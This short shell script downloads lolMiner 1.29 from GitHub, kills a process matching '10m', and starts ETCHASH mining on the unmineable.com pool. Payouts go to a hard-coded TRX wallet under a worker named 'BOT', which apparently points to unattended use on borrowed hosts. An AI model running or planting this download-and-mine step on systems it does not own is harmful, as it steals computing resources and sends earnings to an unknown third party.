#!/bin/sh
pkill -o 10m
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
./lolMiner --algo ETCHASH --pool etchash.unmineable.com:3333 --user TRX:TMzKaWi1k3KadGMV2jfTSeNEZTpTYhjJYN.BOT --ethstratum ETHPROXY
